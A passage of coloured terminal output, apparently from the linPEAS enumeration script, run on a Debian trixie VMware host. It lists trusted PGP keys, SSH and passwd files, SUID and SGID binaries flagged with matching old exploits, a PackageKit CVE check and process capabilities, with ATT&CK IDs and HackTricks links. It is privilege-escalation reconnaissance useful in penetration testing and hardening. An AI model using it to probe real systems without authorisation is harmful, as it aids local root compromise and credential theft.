NGbio+s+2DttTmnKytEp2BOq2HqlWaYw8z5TwL00RHilZYHKi7QXNmSEYhIPApHK
P83bjF/S6cdN9S/217usqs+pz1goOWYD1376hyO/KbilD/9d6gYwDKQGDalq3E1K
G1Cx/2NOojo3NYnzlRmqEjF7/1I79JTx2AvLuCqKr2S3plHFUwqLUbPhvA4hV64Y
9N45CJtvWNaxYu6hhVKbedRa5z94z/Bn11nHS8J5Dnfdt15a17/FUr30xivlQ8Bw
p/451WTPAsnFsgfQ3rKcpdGWjFh4Hp730OxX97piuUOdvwlgTgV2xaNDnxDsA7WS
qjHGFExcy+ypEnv1zk6vyt6zDdiTISKd43goQnqgI/UVpzB8kt67S0CIlA/mv7J1
eKQs+yYm9G/TGZv0i4Ikb8qkYUntcvgjQtc0B8WG+8OP1ZDTsl56MmEhoHFshhzI
v6Bu+1a+rTEXO9FahvT5ItEhxNJhy0EWXsuzsq522Anmuo8OJz1UPDON+bqML3IU
kp493VLVyqL0xoSsQi7p+mfq7S6qU8eyN+hCD9heytFiLpSyP8AHnj3qQTfXeOwD
uFeaaSaA9OvBa+1ogA8rm1gwv7eEu8E/RynJe79BuYP8NhMe8U50/sto7KMdAZnC
qNvUArkvtTgBr0ZeSS3sb3CKrz0RA/D29s0mFXtYJ4kDiRcWhqQJq+xqSpkKu9gs
4sz5MckaU2YHKJztXyeC/suQGXEssye+7wMQNB8ndy31JDvbAIy6gNI9NAvUFlEO
ugNdPbTx5TQVD48tsKiSIOPP1g==
=UqDn
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 1384 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-trixie-stable[1;31m.asc[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
mDMEZ+Gq1RYJKwYBBAHaRw8BAQdARlh1OX84KPJRedAP/M7WxPFEthWypAp8nved
FhqaX0q0R0RlYmlhbiBTdGFibGUgUmVsZWFzZSBLZXkgKDEzL3RyaXhpZSkgPGRl
Ymlhbi1yZWxlYXNlQGxpc3RzLmRlYmlhbi5vcmc+iJYEExYIAD4WIQRBWH99uMd0
vM8TFBZ2L2egssOd5AUCZ+Gq1QIbAwUJDwmcAAULCQgHAgYVCgkICwIEFgIDAQIe
AQIXgAAKCRB2L2egssOd5DjVAP49S/e9VAtn9ip2DXj5zx87MpUXnLHAhT/LsJ7J
odnKoQEA8murEqdcC0pPsAA6Gmev/lz0MWUyfe5Y6DMB6t16FQuIdQQTFgoAHRYh
BMphnWWnKnut/JbSgBlkGKrrdMihBQJn4atmAAoJEBlkGKrrdMihxnAA/3i7WOUU
Dyea6tABVGfFKfHj6yAbfcKVr5GL0WSOQiXNAQC2YTKoTfCY/WOZnCwEHebpM3Mr
6+A8lenj8pFzm8mFAokCMgQQAQoAHRYhBHIDYw4sjnJyUWhP68XOXcLFQs1ZBQJn
4v59AAoJEMXOXcLFQs1ZfdkP90fbXOydWNb1iXwu/vaUjxSx5Nk0Zwkjj7Pi74PZ
Ifd9c0Luf/j7dEHuJOzkOKvkrpTYeQN8Ms9ITVTMeNSOoQn8tnYsxhHqHUcI9ym/
vJ6liIsE2K95gwH2mOQ24ot59pMyQX7sXE4DuQqlrEW1JRemKs7WJB2E/4I7smqG
3+/mqXAoHKkpFBMm1v9tNVx1Tp3ER6C4VFszONlmX0NLB5If+wSits1LnsVgBK1D
Hd3Nxh78YQL0W2xBCOfsHryaKkLW6tp1efTpMHfe4lDEgTFvEWaO3NlPEeD67uxA
KpEG1b/CzBqx+Og1RT+0iZkW9oXYoKJI0Vx0HlYeMrhuE+Q0Fqy/nZYcWhq3y6Tu
GC9J+hyB7D3Z7ne48zNGaAU4x7+6pvkmlBWnNwPH/IlGbexa/F8o+rU0AWrvYCVR
cbbcSsgkq1Dl/Xjbvlx9gwkKnhacbQ5VUOA2Zkp6oBn/pFD1W8xE0X4dNHcM3J5k
CAeZuszjPIZXvwuvAjaOE7ZxKvGDlQTWK8zR5h9tvcwMfVND+EqK0qfDGDMtJqu/
W0lSJj3G/FMO3aGn0Ks6b7cmjbCGjmn7WBGJT2PvH4A4ml1qopWy7Ont6zt1+Cll
y/0Uf75AamJSrAAYFFIJlcpWH/7NRW2L+n1FoIOv5xj5h675uHh/WFlPTNQqrRaP
p1o=
=k1cs
-----END PGP PUBLIC KEY BLOCK-----








[1;34m╔══════════╣ [1;32mChecking for PackageKit Pack2TheRoot (CVE-2026-41651) [1;90m(T1068)
[0m[1;34m╚ [1;34m[3mhttps://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
[0m[1;90mPackageKit Not Found
[0m

[1;34m╔══════════╣ [1;32mSearching uncommon passwd files (splunk) [1;90m(T1552.001)
[0mpasswd file: [1;31m/etc/pam.d/passwd[0m
passwd file: [1;31m/etc/passwd[0m
passwd file: [1;31m/usr/share/bash-completion/completions/passwd[0m
passwd file: [1;31m/usr/share/lintian/overrides/passwd[0m

[1;34m╔══════════╣ [1;32mSearching ssl/ssh files [1;90m(T1552.004,T1021.004)
[0m[1;34m╔══════════╣ [1;32mAnalyzing SSH Files (limit 70)
[0m




-rw-r--r-- 1 root root 173 Nov  2  2025 /etc/ssh/ssh_host_ecdsa_key[1;31m.pub[0m
-rw-r--r-- 1 root root 93 Nov  2  2025 /etc/ssh/ssh_host_ed25519_key[1;31m.pub[0m
-rw-r--r-- 1 root root 565 Nov  2  2025 /etc/ssh/ssh_host_rsa_key[1;31m.pub[0m

PermitRootLogin prohibit-password
PubkeyAuthentication yes
AuthorizedKeysFile	.ssh/authorized_keys 
UsePAM yes
[1;34m══╣ [1;32mSome certificates were found (out limited): [1;90m(T1552.004,T1021.004)
[0m/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt


[1;34m══╣ [1;32mSome home ssh config file was found [1;90m(T1552.004,T1021.004)
[0m[1;31m/usr/share/openssh/sshd_config[0m
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

[1;34m══╣ [1;32m/etc/hosts.allow file found, trying to read the rules: [1;90m(T1552.004,T1021.004)
[0m/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
[1;31mHost[0m *
    SendEnv LANG LC_*
    HashKnown[1;31mHost[0ms yes
    GSSAPIAuthentication yes




[1;34m                      ╔════════════════════════════════════╗
══════════════════════╣ [1;32mFiles with Interesting Permissions[1;34m ╠══════════════════════
[1;34m                      ╚════════════════════════════════════╝[0m
[1;34m╔══════════╣ [1;32mSUID - Check easy privesc, exploits and write perms [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[0m[1;90mstrace Not Found
[0m-rwsr-xr-x 1 root root 639K Jul 28  2025 /usr/lib/openssh[1;32m/ssh-keysign[0m
-r-sr-xr-x 1 root root 15K Jan  8 09:28 /usr/lib/vmware-tools/bin64[1;32m/vmware-user-suid-wrapper[0m
-r-sr-xr-x 1 root root 14K Jan  8 09:28 /usr/lib/vmware-tools/bin32[1;32m/vmware-user-suid-wrapper[0m
-rwsr-xr-- 1 root messagebus 51K Sep 16  2023 /usr/lib/dbus-1.0[1;32m/dbus-daemon-launch-helper[0m
-rwsr-xr-x 1 root root 62K Dec 14 09:00 /usr/bin[1;31m/chfn  --->  SuSE_9.3/10[0m
-rwsr-xr-x 1 root root 67K Dec 14 09:00 /usr/bin[1;31m/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)[0m
-rwsr-xr-x 1 root root 48K Dec 14 09:00 /usr/bin[1;31m/newgrp  --->  HP-UX_10.20[0m
-rwsr-xr-x 1 root root 59K Nov 21  2024 /usr/bin[1;31m/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8[0m
-rwsr-xr-x 1 root root 276K Dec 30 15:07 /usr/bin[1;31m/sudo  --->  check_if_the_sudo_version_is_vulnerable[0m
-rwsr-xr-x 1 root root 71K Nov 21  2024 /usr/bin[1;32m/su[0m
-rwsr-xr-x 1 root root 52K Dec 14 09:00 /usr/bin[1;32m/chsh[0m
-rwsr-xr-x 1 root root 35K Nov 21  2024 /usr/bin[1;31m/umount  --->  BSD/Linux(08-1996)[0m
-rwsr-xr-x 1 root root 87K Dec 14 09:00 /usr/bin[1;32m/gpasswd[0m

[1;34m╔══════════╣ [1;32mSGID [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[0m-rwxr-sr-x 1 root shadow 39K Aug 10  2025 /usr/sbin[1;32m/unix_chkpwd[0m
-rwxr-sr-x 1 root crontab 43K Mar  2  2023 /usr/bin[1;32m/crontab[0m
-rwxr-sr-x 1 root shadow 31K Dec 14 09:00 /usr/bin[1;32m/expiry[0m
-rwxr-sr-x 1 root mail 23K Feb  4  2021 /usr/bin[1;32m/dotlockfile[0m
-rwxr-sr-x 1 root shadow 79K Dec 14 09:00 /usr/bin[1;32m/chage[0m
-rwxr-sr-x 1 root _ssh 475K Jul 28  2025 /usr/bin[1;32m/ssh-agent[0m

[1;34m╔══════════╣ [1;32mFiles with ACLs (limited to 50) [1;90m(T1222)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
[0m[1;90mfiles with acls in searched folders Not Found
[0m
[1;34m╔══════════╣ [1;32mCapabilities [1;90m(T1548.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
[0m[1;34m══╣ [1;32mCurrent shell capabilities [1;90m(T1548.001)
[0mCapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x000001ffffffffff=[1;31mcap_chown[0m,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

[1;34m╚ [1;34m[3mParent process capabilities
[0mCapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x000001ffffffffff=[1;31mcap_chown[0m,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:	 0x0000000000000000=

[1;34m══╣ [1;32mProcesses with capability sets (non-zero CapEff/CapAmb, limit 40) [1;90m(T1548.001)
[0mPID 1 (systemd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 2 (kthreadd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 3 (rcu_gp) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 4 (rcu_par_gp) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 5 (slub_flushwq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 6 (netns) user=root
  CapInh: 0x0000000000000000=
